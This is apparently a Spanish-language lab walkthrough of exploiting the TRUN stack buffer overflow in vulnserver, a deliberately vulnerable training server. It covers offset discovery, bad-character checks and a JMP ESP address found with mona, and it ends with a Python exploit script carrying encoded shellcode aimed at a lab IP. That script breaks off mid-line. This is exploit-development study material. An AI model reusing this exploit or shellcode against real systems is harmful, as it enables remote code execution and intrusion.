# Buffer-Overflow TRUN function

[https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver)

vulnserver tiene 4 funciones en las que declara un buffer, cada buffer es distinto en cada función:

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%201.png)

vulnserver tiene una funcionalidad que se llama TRUN la cual utiliza la funcion3 vista anteriormente, en esta condición podemos ver que se declara un buffer de 3000 en la que hay otra condición que para que se cumpla tiene que haber un ‘.’ en el input del usuario.

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%202.png)

Si reflejamos esto en la practica, le pasamos a vulnserver esta cadena:

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%203.png)

Miramos en el Inmunity Debugger y hemos conseguido crashear vulnserver y sobrescribir el EIP

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled.png)

Calculamos el offset con la herramienta de metasploit `patter_create`

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%201.png)

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%202.png)

Miramos en el inmunity debugger el valor del EIP

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%203.png)

Utilizamos la herramienta `pattern_offset` para ver el numero de caracteres en el cual empezamos a sobrescribir el EIP

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%204.png)

hemos sacado el offset de vulnserver y sabemos que tenemos que pasarle 2006 A para sobrescribir el EIP.

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%205.png)

Probamos a sobrescribir el EIP con 4 “B”.

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%206.png)

Ahora comprobamos si hay algún bad_chars, de la siguiente forma:

Enviamos los bad_chars después de sobrescribir el EIP:

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%207.png)

Vamos al inmunity debugger y vemos si en el ESP hay algún bad_char

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%208.png)

Como podemos ver en el ESP no hay ningún bad character, el único que da siempre fallos es el carácter nulo \x00\, nuestro payload no puede tener este carácter.

Ahora tenemos que buscar un modulo vulnerable, con el inmunity debugger podemos encontrarla gracias al modulo mona, ejecutando el comando `!mona modules`

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%209.png)

Vemos que tiene un modulo que no tiene ninguna protección añadida:

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%2010.png)

Ahora podemos meter código ensamblador en este modulo, para ello lo haremos de la siguiente forma:

Queremos hacer un jump al ESP, con la herramienta `nasm_shell` podemos sacar el valor que tiene que tener para que realice un jmp esp

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%2011.png)

Con mona buscamos las instrucciones que queremos con el siguiente comando:

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%2012.png)

Tenemos varios resultados, podemos probar con cualquiera de ellos, ahora en vez de escribir las 4 B, tenemos que escribir la dirección de esos resultados.

ponemos en pausa la dirección que hemos utilizado para poder comprobarlo.

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%2013.png)

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%2014.png)

EIP tiene el valor que queremos, ahora solo tenemos que crear nuestro exploit.

ahora puedo empezar a añadir mi código malicioso, de la siguiente manera.

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%2015.png)

Creamos nuestro script y añadimos el shellcode:

```python
#!/usr/bin/python3

from pwn import *
from struct import pack

#CTRL+C
def def_handler(sig,frame):
	print("\n[!]Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	p1 = log.progress("Buffer-Overflow Vulnserver")

	shellcode =  b""
	shellcode += b"\xb8\x31\xa1\x07\xc8\xda\xc8\xd9\x74\x24\xf4"
	shellcode += b"\x5a\x33\xc9\xb1\x52\x83\xea\xfc\x31\x42\x0e"
	shellcode += b"\x03\x73\xaf\xe5\x3d\x8f\x47\x6b\xbd\x6f\x98"
	shellcode += b"\x0c\x37\x8a\xa9\x0c\x23\xdf\x9a\xbc\x27\x8d"
	shellcode += b"\x16\x36\x65\x25\xac\x3a\xa2\x4a\x05\xf0\x94"
	shellcode += b"\x65\x96\xa9\xe5\xe4\x14\xb0\x39\xc6\x25\x7b"
	shellcode += b"\x4c\x07\x61\x66\xbd\x55\x3a\xec\x10\x49\x4f"
	shellcode += b"\xb8\xa8\xe2\x03\x2c\xa9\x17\xd3\x4f\x98\x86"
	shellcode += b"\x6f\x16\x3a\x29\xa3\x22\x73\x31\xa0\x0f\xcd"
	shellcode += b"\xca\x12\xfb\xcc\x1a\x6b\x04\x62\x63\x43\xf7"
	shellcode += b"\x7a\xa4\x64\xe8\x08\xdc\x96\x95\x0a\x1b\xe4"
	shellcode += b"\x41\x9e\xbf\x4e\x01\x38\x1b\x6e\xc6\xdf\xe8"
	shellcode += b"\x7c\xa3\x94\xb6\x60\x32\x78\xcd\x9d\xbf\x7f"
	shellcode += b"\x01\x14\xfb\x5b\x85\x7c\x5f\xc5\x9c\xd8\x0e"
	shellcode += b"\xfa\xfe\x82\xef\x5e\x75\x2e\xfb\xd2\xd4\x27"
	shellcode += b"\xc8\xde\xe6\xb7\x46\x68\x95\x85\xc9\xc2\x31"
	shellcode += b"\xa6\x82\xcc\xc6\xc9\xb8\xa9\x58\x34\x43\xca"
	shellcode += b"\x71\xf3\x17\x9a\xe9\xd2\x17\x71\xe9\xdb\xcd"
	shellcode += b"\xd6\xb9\x73\xbe\x96\x69\x34\x6e\x7f\x63\xbb"
	shellcode += b"\x51\x9f\x8c\x11\xfa\x0a\x77\xf2\xc5\x63\x9d"
	shellcode += b"\x80\xae\x71\x61\x84\x95\xff\x87\xec\xf9\xa9"
	shellcode += b"\x10\x99\x60\xf0\xea\x38\x6c\x2e\x97\x7b\xe6"
	shellcode += b"\xdd\x68\x35\x0f\xab\x7a\xa2\xff\xe6\x20\x65"
	shellcode += b"\xff\xdc\x4c\xe9\x92\xba\x8c\x64\x8f\x14\xdb"
	shellcode += b"\x21\x61\x6d\x89\xdf\xd8\xc7\xaf\x1d\xbc\x20"
	shellcode += b"\x6b\xfa\x7d\xae\x72\x8f\x3a\x94\x64\x49\xc2"
	shellcode += b"\x90\xd0\x05\x95\x4e\x8e\xe3\x4f\x21\x78\xba"
	shellcode += b"\x3c\xeb\xec\x3b\x0f\x2c\x6a\x44\x5a\xda\x92"
	shellcode += b"\xf5\x33\x9b\xad\x3a\xd4\x2b\xd6\x26\x44\xd3"
	shellcode += b"\x0d\xe3\x64\x36\x87\x1e\x0d\xef\x42\xa3\x50"
	shellcode += b"\x10\xb9\xe0\x6c\x93\x4b\x99\x8a\x8b\x3e\x9c"
	shellcode += b"\xd7\x0b\xd3\xec\x48\xfe\xd3\x43\x68\x2b"
	
	buffer = b"A"*2006 
	buffer += pack("<I", 0x625011bb) # JMP ESP
	buffer += b"\x90"*24
	buffer += shellcode
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(('192.168.234.133', 9999))
	s.send(b'TRUN .' + buffer)
	p1.status("Payload sen
```

Lo ejecutamos y vemos si ganamos acceso:

![Untitled](/assets/images/Buffer-Overflow-trun/Untitled%2016.png)